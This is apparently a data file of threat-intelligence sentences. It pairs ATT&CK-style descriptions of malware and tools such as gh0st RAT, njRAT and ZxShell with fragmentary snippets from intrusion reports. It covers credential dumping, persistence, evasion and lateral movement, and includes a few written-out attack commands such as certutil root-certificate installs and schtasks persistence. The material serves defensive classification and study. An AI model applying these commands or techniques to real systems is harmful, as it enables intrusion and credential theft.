Zeus Panda can perform keylogging on the victim’s machine by hooking the functions TranslateMessage and WM_KEYDOWN.
Zeus Panda modifies several Registry keys under &lt;code&gt;HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\&lt;/code&gt; to disable phishing filters.
Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.
Zeus Panda uses PowerShell to download and execute the payload.
Zeus Panda checks for running processes on the victim’s machine.
Zeus Panda checks for the existence of a Registry key and if it contains certain values.
Zeus Panda adds persistence by creating Registry Run keys.
Zeus Panda can take screenshots of the victim’s machine.
Zeus Panda checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim’s environment.
Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.
Zeus Panda queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN.
Zeus Panda collects the current system time (UTC) and sends it back to the C2 server.
Zeus Panda uses HTTP for C2 communications.
Zeus Panda can launch an interface where it can execute several commands on the victim’s PC.
Zox has the ability to upload files from a targeted system.
Zox has been encoded with Base64.
Zox has the ability to leverage local and remote exploits to escalate privileges.
Zox can enumerate files on a compromised host.
Zox can download files to a compromised machine.
Zox has the ability to list processes.
Zox has the ability to use SMB for communication.
Zox has used the .PNG file format for C2 communications.
Zox can enumerate attached drives.
ZxShell has a command to clear system event logs.
ZxShell has a command called RunAs, which creates a new process as another user or process context.
ZxShell hooks several API functions to spawn system threads.
ZxShell can transfer files from a compromised host.
ZxShell can disable the firewall by modifying the registry key &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile&lt;/code&gt;.
ZxShell can kill AV products' processes.
ZxShell is injected into a shared SVCHOST process.
ZxShell has a feature to perform SYN flood attack on a host.
ZxShell has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.
ZxShell can delete files from the system.
ZxShell has used FTP for C2 connections.
ZxShell has a command to open a file manager and explorer on the system.
ZxShell has a command to transfer files from a remote host.
ZxShell has a feature to capture a remote computer's keystrokes using a keylogger.
ZxShell has a feature to create local user accounts.
ZxShell can create Registry entries to enable services to run.
ZxShell can leverage native API including &lt;code&gt;RegisterServiceCtrlHandler &lt;/code&gt; to register a service.RegisterServiceCtrlHandler
ZxShell can launch port scans.
ZxShell can use ports 1985 and 1986 in HTTP/S communication.
ZxShell has a command, ps, to obtain a listing of processes on the system.
ZxShell can set up an HTTP or SOCKS proxy.
ZxShell can query the netsvc group value data located in the svchost group Registry key.
ZxShell has remote desktop functionality.
ZxShell has used rundll32.exe to execute other DLLs and named pipes.
ZxShell can capture screenshots.
ZxShell can create a new service for execution.
ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory.
ZxShell can collect the owner and organization information from the target workstation.
ZxShell can check the services on the system.
ZxShell supports functionality for VNC sessions.
ZxShell has a command to perform video device spying.
ZxShell has used HTTP for C2 connections.
ZxShell can launch a reverse command shell.
ZxShell can create a new service using the service parser function ProcessScCommand.
ZxxZ can collect data from a compromised host.
ZxxZ has used a XOR key to decrypt strings.
ZxxZ has been encoded to avoid detection from static analysis tools.
ZxxZ can download and execute additional files.
ZxxZ has relied on victims to open a malicious attachment delivered via email.
ZxxZ has been disguised as a Windows security update service.
ZxxZ has used API functions such as `Process32First`, `Process32Next`, and `ShellExecuteA`.
ZxxZ has created a snapshot of running processes using `CreateToolhelp32Snapshot`.
ZxxZ can search the registry of a compromised host.
ZxxZ has used scheduled tasks for persistence and execution.
ZxxZ can search a compromised host to determine if it is running Windows Defender or Kasperky antivirus.
ZxxZ has been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment.
ZxxZ has collected the host name and operating system product name from a compromised machine.
ZxxZ can collect the username from a compromised host.
adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.
adbupd can run a copy of cmd.exe.
adbupd can use a WMI script to achieve persistence.
at can be used to schedule a task on a system to be executed at a specific date or time.
build_downer has the ability to download files from C2 to the infected host.
build_downer has added itself to the Registry Run key as "NVIDIA" to appear legitimate.
build_downer has the ability to use the &lt;code&gt;WinExec&lt;/code&gt; API to execute malware on a compromised host.
build_downer has the ability to add itself to the Registry Run key for persistence.
build_downer has the ability to detect if the infected host is running an anti-virus process.
build_downer can extract malware from a downloaded JPEG.
build_downer has the ability to send system volume information to C2.
build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.
ccf32 has used `xcopy \\&lt;target_host&gt;\c$\users\public\path.7z c:\users\public\bin\&lt;target_host&gt;.7z /H /Y` to archive collected files.
ccf32 can be used to automatically collect files from a compromised host.
ccf32 can collect files from a compromised host.
ccf32 can upload collected data and files to an FTP server.
ccf32 can delete files and folders from compromised machines.
ccf32 can parse collected files to identify specific file extensions.
ccf32 has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day).
ccf32 can temporarily store files in a hidden directory on the local host.
ccf32 has copied files to a remote machine infected with Chinoxy or another backdoor.
ccf32 can run on a daily basis using a scheduled task.
ccf32 can determine the local time on targeted machines.
ccf32 has used `cmd.exe` for archiving data and deleting files.
certutil may be used to Base64 encode collected data.
certutil has been used to decode binaries hidden inside certificate files as Base64 information.
certutil can be used to download files from a given URL.
certutil can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: &lt;code&gt;certutil -addstore -f -user ROOT ProgramData\cert512121.der&lt;/code&gt;.
cmd can be used to delete files from the file system.
cmd can be used to find files and directories with native functionality such as &lt;code&gt;dir&lt;/code&gt; commands.
cmd can be used to copy files to/from a remotely connected external system.
cmd can be used to copy files to/from a remotely connected internal system.
cmd can be used to find information about the operating system.
cmd is used to execute programs and other actions at the command-line interface.
down_new has the ability to list the directories on a compromised host.
down_new has the ability to download files to the compromised host.
down_new has the ability to list running processes on a compromised host.
down_new has the ability to detect anti-virus products and processes on a compromised host.
down_new has the ability to gather information on installed applications.
down_new has the ability to base64 encode C2 communications.
down_new has the ability to AES encrypt C2 communications.
down_new has the ability to identify the system volume information of a compromised host.
down_new has the ability to identify the MAC address of a compromised host.
down_new has the ability to use HTTP in C2 communications.
dsquery can be used to gather information on user accounts within a domain.
dsquery can be used to gather information on permission groups within a domain.
dsquery can be used to gather information on domain trusts with &lt;code&gt;dsquery * -filter "(objectClass=trustedDomain)" -attr *&lt;/code&gt;.
dsquery has the ability to enumerate various information, such as the operating system and host name, for systems within a domain.
esentutl can be used to collect data from local file systems.
esentutl can use the Volume Shadow Copy service to copy locked files such as `ntds.dit`.
esentutl can be used to copy files from a given URL.
esentutl can be used to copy files to/from a remote share.
esentutl can copy `ntds.dit` using the Volume Shadow Copy service.
esentutl can be used to read and write alternate data streams.
ftp may be used to exfiltrate data separate from the main command and control protocol.
ftp may be abused by adversaries to transfer tools or files from an external system into a compromised environment.
ftp may be abused by adversaries to transfer tools or files between systems within a compromised environment.
gh0st RAT is able to wipe event logs.
gh0st RAT is able to open a remote shell to execute commands.
A gh0st RAT variant has used DLL side-loading.
gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched.
gh0st RAT has encrypted TCP communications to evade detection.
gh0st RAT operators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.
gh0st RAT has the capability to to delete files.
gh0st RAT can download files to the victim’s machine.
gh0st RAT has a keylogger.
gh0st RAT has altered the InstallTime subkey.
gh0st RAT has used the `InterlockedExchange`, `SeShutdownPrivilege`, and `ExitWindowsEx` Windows API functions.
gh0st RAT has used an encrypted protocol within TCP segments to communicate with the C2.
gh0st RAT has the capability to list processes.
gh0st RAT can inject malicious code into process created by the “Command_Create&amp;Inject” function.
gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.
gh0st RAT has added a Registry Run key to establish persistence.
A gh0st RAT variant has used rundll32 for execution.
gh0st RAT can capture the victim’s screen remotely.
gh0st RAT can execute its service if the Service key exists. If the key does not exist, gh0st RAT will create and run the service.
gh0st RAT can load DLLs into memory.
gh0st RAT has used Zlib to compress C2 communications data before encrypting it.
gh0st RAT uses RC4 and XOR to encrypt C2 traffic.
gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information.
gh0st RAT can create a new service to establish persistence.
gsecdump can dump LSA secrets.
gsecdump can dump Windows password hashes from the SAM.
hcdLoader provides command-line access to the compromised system.
hcdLoader installs itself as a service for persistence.
httpclient encrypts C2 content with XOR using a single byte, 0x12.
httpclient uses HTTP for command and control.
httpclient opens cmd.exe on the victim.
iKitten will zip up the /Library/Keychains directory before exfiltrating it.
iKitten prompts the user for their credentials.
iKitten saves itself with a leading "." so that it's hidden from users by default.
iKitten collects the keychains on the system.
iKitten lists the current processes running.
iKitten adds an entry to the rc.common file for persistence.
iKitten will look for the current IP address.
ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.
ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.
jRAT can capture microphone recordings.
jRAT can capture clipboard data.
jRAT can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.
jRAT can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.
jRAT has a function to delete files from the victim’s machine.
jRAT can browse file systems.
jRAT can download and execute files.
jRAT has been distributed as HTA files with JScript.
jRAT has the capability to log keystrokes from the victim’s machine, both offline and online.
jRAT’s Java payload is encrypted with AES. Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of jRAT also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.
jRAT can map UPnP ports.
jRAT can steal keys for VPNs and cryptocurrency wallets.
jRAT can query and kill system processes.
jRAT can serve as a SOCKS proxy server.
jRAT can support RDP control.
jRAT can be configured to reconnect at certain intervals.
jRAT has the capability to take screenshots of the victim’s machine.
jRAT can list security software, such as by using WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.
jRAT payloads have been packed.
jRAT can list and manage startup entries.
jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.
jRAT can gather victim internal and external IPs.
jRAT can list network connections.
jRAT can list local services.
jRAT has the capability to capture video from a webcam.
jRAT has been distributed as HTA files with VBScript.
jRAT has command line access.
jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.
macOS.OSAMiner has used `osascript` to call itself via the `do shell script` command in the Launch Agent `.plist` file.
macOS.OSAMiner has searched for the Activity Monitor process in the System Events process list and kills the process if running. macOS.OSAMiner also searches the operating system's `install.log` for apps matching its hardcoded list, killing all matching process names.
macOS.OSAMiner has embedded Stripped Payloads within another run-only Stripped Payloads.
macOS.OSAMiner has used `curl` to download a Stripped Payloads from a public facing adversary-controlled webpage.
macOS.OSAMiner has placed a Stripped Payloads with a `plist` extension in the Launch Agent's folder.
macOS.OSAMiner has used `launchctl` to restart the Launch Agent.
macOS.OSAMiner has used `ps ax | grep &lt;name&gt; | grep -v grep | ...` and `ps ax | grep -E...` to conduct process discovery.
macOS.OSAMiner has used run-only Applescripts, a compiled and stripped version of AppleScript, to remove human readable indicators to evade detection.
macOS.OSAMiner can parse the output of the native `system_profiler` tool to determine if the machine is running with 4 cores.
macOS.OSAMiner can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility `df`.
meek uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.
metaMain has used XOR-based encryption for collected files before exfiltration.
metaMain can support an HKCMD sideloading start method.
metaMain can collect files and system information from a compromised host.
metaMain can decrypt and load other modules.
metaMain's module file has been encrypted via XOR.
metaMain can upload collected files and data to its C2 server.
metaMain has deleted collected items after uploading the content to its C2 server.
metaMain can recursively enumerate files in an operator-provided directory.
metaMain can download files onto compromised systems.
metaMain can log mouse events.
metaMain can create a named pipe to listen for and send data to a named pipe-based C2 server.
metaMain has the ability to log keyboard events.
metaMain has stored the collected system files in a working directory.
metaMain can write the process ID of a target process into the `HKEY_LOCAL_MACHINE\SOFTWARE\DDE\tpid` Registry value as part of its reflective loading activity.
metaMain can execute an operator-provided Windows command by leveraging functions such as `WinExec`, `WriteFile`, and `ReadFile`.
metaMain can establish an indirect and raw TCP socket-based connection to the C2 server.
metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure.
metaMain can enumerate the processes that run on the platform.
metaMain can inject the loader file, Speech02.db, into a process.
metaMain has reflectively loaded a DLL to read, decrypt, and load an orchestrator file.
metaMain can take and save screenshots.
metaMain can encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm.
metaMain can collect the computer name from a compromised host.
metaMain can collect the username from a compromised host.
metaMain has delayed execution for five to six minutes during its persistence establishment process.
metaMain can change the `CreationTime`, `LastAccessTime`, and `LastWriteTime` file time attributes when executed with `SYSTEM` privileges.
metaMain can use HTTP for C2 communications.
metaMain registered a WMI event subscription consumer called "hard_disk_stat" to establish persistence.
nbtstat can be used to discover local NetBIOS domain names.
nbtstat can be used to discover current NetBIOS sessions.
netsh can be used to disable local firewall settings.
netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.
netsh can be used to set up a proxy tunnel to allow remote host access to an infected host.
netsh can be used to discover system firewall settings.
netstat can be used to enumerate local network connections, including active TCP connections and other network statistics.
ngrok can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.
ngrok has been used by threat actors to configure servers for data exfiltration.
ngrok can tunnel RDP and other services securely over internet connections.
ngrok can be used to proxy connections to machines located behind NAT or firewalls.
ngrok has been used by threat actors to proxy C2 connections to ngrok service subdomains.
njRAT gathers information about opened windows during the initial infection.
njRAT is capable of manipulating and deleting registry keys, including those used for persistence.
njRAT has used AutoIt to compile the payload and main script into a single executable after delivery.
njRAT has a module that steals passwords saved in victim web browsers.
njRAT can collect data from a local system.
njRAT has modified the Windows firewall to allow itself to communicate through the firewall.
njRAT has included a base64 encoded executable.
njRAT has used HTTP to receive stolen information from the infected machine.
njRAT has used a fast flux DNS for C2 IP resolution.
njRAT is capable of deleting files.
njRAT can browse file systems using a file manager module.
njRAT can download files to the victim’s machine.
njRAT is capable of logging keystrokes.
njRAT can create, delete, or modify a specified Registry key or value.
njRAT has used the ShellExecute() function within a script.
njRAT has used port 1177 for HTTP C2 communications.
njRAT will attempt to detect if the victim system has a camera during the initial infection. njRAT can also detect any removable drives connected to the system.
njRAT has executed PowerShell commands via auto-run registry key persistence.
njRAT can search a list of running processes for Tr.exe.
njRAT can read specific registry values.
njRAT has added persistence via the Registry key &lt;code&gt;HKCU\Software\Microsoft\CurrentVersion\Run\&lt;/code&gt; and dropped a shortcut in &lt;code&gt;%STARTUP%&lt;/code&gt;.
njRAT has a module for performing remote desktop access.
njRAT can identify remote hosts on connected networks.
njRAT can be configured to spread via removable drives.
njRAT can capture screenshots of the victim’s machines.
njRAT uses Base64 encoding for C2 traffic.
njRAT enumerates the victim operating system and computer name during the initial infection.
njRAT enumerates the current user during the initial infection.
njRAT can access the victim's webcam.
njRAT has used HTTP for C2 communications.
njRAT can launch a command shell interface for executing commands.
If an initial connectivity check fails, pngdowner attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.
pngdowner deletes content from C2 communications that was saved to the user's temporary directory.
pngdowner uses HTTP for command and control.
pwdump can be used to dump credentials from the SAM.
route can be used to discover routing configuration information.
schtasks is used to schedule tasks on a Windows system to run at a specific date and time.
spwebmember is used to enumerate and dump information from Microsoft SharePoint.
sqlmap can be used to automate exploitation of SQL injection vulnerabilities.
xCaon has added persistence via the Registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load&lt;/code&gt; which causes the malware to run each time any user logs in.
xCaon has uploaded files from victims' machines.
xCaon has decoded strings from the C2 server before executing commands.
xCaon has a command to download files to the victim's machine.
xCaon has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API.
xCaon has checked for the existence of Kaspersky antivirus software on the system.
xCaon has used Base64 to encode its C2 traffic.
xCaon has encrypted data sent to the C2 server using a XOR key.
xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address.
xCaon has communicated with the C2 server by sending POST requests over HTTP.
xCaon has a command to start an interactive shell.
xCmd can be used to execute binaries on remote systems by creating and starting a service.
yty communicates to the C2 server by retrieving a Google Doc.
yty contains junk code in its binary, likely to confuse malware analysts.
yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.
yty gathers information on victim’s drives and has a plugin for document listing.
yty uses a keylogger plugin to gather keystrokes.
yty gets an output of running processes using the &lt;code&gt;tasklist&lt;/code&gt; command.
yty uses the &lt;code&gt;net view&lt;/code&gt; command for discovery.
yty establishes persistence by creating a scheduled task with the command &lt;code&gt;SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“&lt;/code&gt;.
yty collects screenshots of the victim machine.
yty packs a plugin with UPX.
yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware.
yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command &lt;code&gt;systeminfo&lt;/code&gt;.
yty runs &lt;code&gt;ipconfig /all&lt;/code&gt; and collects the domain name.
yty collects the victim’s username.
zwShell has deleted itself after creating a service as well as deleted a temporary file when the system reboots.
zwShell can browse the file system.
zwShell can modify the Registry.
zwShell has used RDP for lateral movement.
zwShell has been copied over network shares to move laterally.
zwShell has used SchTasks for execution.
zwShell can obtain the victim PC name and OS version.
zwShell can obtain the victim IP address.
zwShell can obtain the name of the logged-in user on the victim.
zwShell can launch command-line shells.
zwShell has established persistence by adding itself as a new service.
This file extracts credentials from LSASS similar to Mimikatz.
It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process.
It spreads to Microsoft Windows machines using several propagation methods, including the EternalBlue exploit for the CVE-2017-0144 vulnerability in the SMB service.
SMB exploitation via EternalBlue
SMBv1 Exploitation via EternalBlue
has the capability to exploit SMBv1 via the well known EternalBlue exploit.
SMB copy and remote execution
This thread is then used to execute the SMB copy and remote execution
SMB copy and remote execution
SMB Copy and Remote Execution
The malware decompresses its resource named
The malware decompresses a resource
This is used as an integrity check for the decryption process.
decrypt the MFT,
the code attempts to decrypt the contents
Once the sector is decrypted,
and the same key is used to decrypt the MFT.
is also decoded, and placed back
its resource section are decompressed and written to disk
The malware is a DLL that is launched using rundll32.exe:
being invoked by rundll32.exe.
Command Line Execution
Once the command line arguments are generated
The malware also spawns cmd.exe to execute the following command
that hashes each running process on the system
Process Hashes and Process Privilege Checks
to track which of the 3 processes are running on the system.
compares each hash with 3 hardcoded hashes:

0x6403527E → avp.exe associated with Kaspersky AV
0x23214B44  → ns.exe associated with Norton Security
0x651B3005 → ccSvcHst.exe associated with Symantec
using the API NtRaiseHardError
invokes the following API’s:
GetExtendedTcpTable to retrieve a list of TCP endpoints
GetIpNetTable to retrieve
NetServerEnum to get a list
NetServerGetInfoto retrieve the current configuration
CreateFile and WriteFile are used
CreateProcessAsUser or CreateProcess is executed,
is created using the same API call;
Calls CryptEncrypt
it also invokes the API NTRaiseHardError.
undocumented Windows API that causes
If the API fails to execute, the malware calls InitiateSystemShutdownExW
NetServerGetInfoto retrieve the current configuration for the local server
Obtains the IP address from the ClientIpAddress field
There are two approaches to using valid credentials to copy and execute the malware to a remote host:
is used to connect to a server using the default credentials
WMIC
C:\Windows\system32\wbem\wmic.exe /node
encodes it using XOR encoding with key
contains the original MBR that was encoded by XORing
which were previously encrypted
the original encoded MBR
obtain keystrokes, and status of keyboard buffer
The malware only targets fixed drives on the system.
The malware will first start enumerating files in the directory it is being executed from.
the scheduled task is set to trigger 60 minutes after the malware execution by default.
the scheduled task will trigger 30 minutes after the malware execution.
Explanation of schtask parameters
taskrun. Path and filename of the task to be run
For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.
delete important files
the configuration file will be deleted
threat actors use Themida packer to obfuscate the signature used for detection.
packed by noted tools
Themida-packed
upload/download file
remote shell functions.
It supports proxy (Socks5),
with SOCKS v5 server
used to dump information from the victim’s Oracle database.
an information stealer used to harvest internal information.
Obfuscated PowerShell script
multi-layer obfuscation
to obfuscate their tools
have adopted more obfuscation techniques
Heavily obfuscated PowerShell script
the encrypted payload
the encrypted payload
to obfuscate control flow of program.
Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.
threat actors use multi-layered AES encryption and base64 encoding to obfuscate
obfuscate the execution flow of the program
the decryption algorithm
decrypted with RC4 algorithm
usage of a highly similar decryption algorithm
to decrypt the payload
decrypt it
the decryption function into RC4
they always have used DLL sideloading as their major technique to launch their malware.
adopted DLL sideloading techniques to run their malware.
used DLL sideloading to launch their malware
The malicious DLL “gtn.dll”, which we named as “ShellFang”, loads when a legitimate executable is launched.
including API hashing and execution flow obfuscation through exception mechanism
Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.
Necessary APIs will be dynamically resolved during execution.
API obfuscation, and execution flow obfuscation
abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing.
the final payload is an HTTPs Cobalt Strike beacon.
by creating immediate tasks through GPO.
abused group policy objects (GPO) to install loaders
Propagation through GPO
they will submit immediate tasks to the hosts in the domain through GPO
As the hosts receive the task through GPO
usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary
Once the victim opens the document,
injecting the shellcode into rundll32.exe
Shellcode which is used for code injection
proxy
create scheduled tasks for persistence.
to create a ImmediateTask
Windows API
Windows APIs
backdoor is a basic remote shell
C:\Windows\System32\cmd.exe /c
forcing its component SmadAVprotect32.exe to side-load their malicious DLL.
the malware starts a function called bypassSMADAV
with the API function IsWindowVisible.
by IsWindowVisible function
calling the RegisterClass function prior to calling CreateWindow.
Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.
the malware creates 2 scheduled tasks
schtasks /Create /TN test /SC MINUTE /MO 15 /TR
the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR "explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe" /f
The final payload returned is a lightweight PowerShell backdoor,
It then picks one random C&amp;C URL out of the three available and constructs a GET request
sends them back to the server in POST request:
After the validation of the JSON and Base64 decoding
used by various actors to disable endpoint protection tools.
techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.
The current system username
The current username home folder
The system’s network interfaces (name, MacAddress, description)
was deployed using DLL side-loading
due to DLL side-loading, the loader/injector winutils.dll is loaded into memory and runs in the context
abused to side-load
Packed Rorschach loader and injector
the initial loader/injector winutils.dll is protected with UPX-style packing
After unpacking, the sample loads
decrypted and injected
and decrypts config
injected into notepad.exe, where the ransomware logic begins.
is injected into notepad.exe
Disable the Windows firewall, using netsh.exe
When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.
creates a group policy
creates another group policy
creates another group policy
deletes them from the original location.
creating a schedule task
that registers a scheduled task which runs immediately and upon user logon,
finds the relevant syscall numbers for NT APIs,
with the syscall instruction
the malware first creates a syscall table for NT APIs
Creation of syscall table for certain NT APIs.
It makes direct system calls using the “syscall” instruction.
Example use of direct syscall.
It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to
The WinAPI CryptGenRandom is utilized
is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation,
Command Line Arguments
the list of processes
code is protected and obfuscated
This obfuscated process
reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.
ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch
call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.
Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object
leaked the stack pointer and retrieved the this pointer as a static offset from the stack.
vfgadget address,
prepare the address of the Windows API we want to invoke along with its arguments.
the Windows API address and its arguments.
invoke any API we like,
began sending spam emails, mailing new malicious attachments to continue spreading.
discover commands using the Windows utilities systeminfo
systeminfo
systeminfo
ipconfig
ipconfig /all
ipconfig /all
Remote access tools were used for command and control, such as Tactical RMM and Anydesk.
the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.
the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.
the threat actors proceeded to deploy several remote management tools across the environment.
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.
the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.
used by the threat actor for the remote management of Tactical RMM Agent.
Using this RMM agent they proceeded to install AnyDesk on the host.
Tactical RMM Agent was installed by the threat actor on a server to ensure remote access
The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands
The Powershell script, when double clicked (executed),
they also used tasklist
Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.
The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers
rasomware deployment to all hosts over SMB.
files transferred via SMB as SYSTEM on remote hosts.
an executable Cobalt Strike beacon was copied via SMB to a target machine
This beacon was then successfully executed via WMI
then executed via WMI.
wmic
setup a Registry Run Key to maintain persistence on the beachhead host.
established persistence via a run key.
commands to download an Emotet DLL onto the computer.
the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.
the threat actors then dropped SoftPerfect’s Network Scanner
dropped and executed on the server
Windows net commands were run,
threat actors proceeded to run the net commands
the threat actors conducted further discovery tasks running find.bat and p.bat,
and a batch file 1.bat were dropped on the host and the batch file was executed
two batch files were run.
The first find.bat was used to run
C:\Windows\System32\cmd.exe /c
cmd.exe /c start
the threat actor executed a batch script
They then proceeded to dump credentials from the LSASS process on the host.
the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.
Process access to LSASS was observed, likely to dump credentials
The Granted Access level matches know indicators for Mimikatz
request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.
With some further process injection
The threat actor was observed process injecting into legitimate process
from a process that was injected with Cobalt Strike.
Injected Process Name
the processes used for injection
The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread
from an injected process
A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.
After choosing a new server and connecting via RDP,
From there, the threat actors began connecting to other hosts via RDP, including the a backup server.
did RDP to a few other servers
traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement
They started by connecting to a new server via RDP
Once establishing the RDP connection, they deployed Powertool64.exe,
The threat actor kept the remote desktop session alive
to execute encoded scripts.
The script will decode itself
The decoded base 64 content
is a Base64 encoded script with various components split into different variables for obfuscation purposes.
A service was also created for the agent.
service was installed in the system
svcService Type: user mode serviceService Start Type: auto startService Account: LocalSystem
a separate service was created for that agent.
service was installed in the system
service was installed in the system
nan
Service Type: user mode serviceService Start Type: auto startService Account: LocalSystem
The threat actor was observed creating remote services
This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.
C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA
delete its process file
delete the driver files.
removing files from the system.
The threat actor was observed deleting files that had been dropped to disk
whoami /groups
The threat actor was observed creating remote services in order to execute beacon DLL files
the threat actors began to review sensitive documents
Both HTTP and HTTPS were observed to be used.
Infected email attachments
obtaining relevant device data, such as OS version and architecture, hardware ID, CPU, RAM, screen resolution, system language, etc.
collects information, primarily system information
can take away system
exfiltrate files and extract data from specific applications.
acquire browsing histories, Internet cookies, usernames/passwords, personally identifiable details, credit card numbers, and other highly sensitive information from browsers.
target stored browser data
collects sensitive information from the victim’s machine
collects cookie information, search histories, and key inputs from browsers
collect inside of the “Web Data” SQLite file
sensitive data from the victim’s machine.
usernames/passwords,
include saved credentials
run under the name “tmp.exe” by unpacking itself to the “C:\Users\admin\AppData\Local\Temp\” file path.
Registry Key Sets
transmits information as a zip file
sends this information to its C2 server
C2 is transmitted as a zip file during the POST request.
transferred to the C2 server as a zip file.
transfers them to the C2 address
many obfuscated strings that are being covered by a random string, “edx765“, to evade detection.
obfuscated information,
passes the obfuscated string to a function that strips the arbitrary string and delivers the original string
passes the obfuscated string to a function that strips the arbitrary string and delivers the original string.
Making a ‘POST’ request,
multiple POST requests to the “c2/sock” address
accessed C2 while visiting port 80
they are instructed to click “Confirm” to view a message from “Express.”
The user is also asked to permit push notifications in the browser,
Once decrypted, the configuration file reveals several parameters,
Decryption exclusion list
decrypted using the RC4 algorithm with a hard-coded key in the resource.
send the decryption program
and decrypted
decrypted using the RC4 algorithm with a hardcoded key in the resource.
the hardcoded key to decrypt the configuration file.
to decrypt the configuration file.
Get configuration file and decrypt it
Decryptor download
The decryptor is delivered in a zip archive containing the decryptor executable
the decryptor to clean up their environment.
At the end of the decryption process, the program indicates the number of decrypted files
Decryptor has finished the decryption process
Decryptor execution
The decryptor program appears unique and is linked to one victim specifically. In our example, it only decrypts the files
one to get information about the machine, such as the operating system version,
one to get processes
reflective DLL loading, to inject a DLL from memory.
Use Windows API functions to inject DLL
a regular Bitmap (open matrix image format used by Windows) that can be used by malware to execute code or as a payload dropper
The image’s pixels are an actual binary representation of the payload.
This process can be summarized as Exe -&gt; Resources -&gt; BMP with embedded data in pixels fetched
The unpacked malware
the configuration file encrypted.
PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption
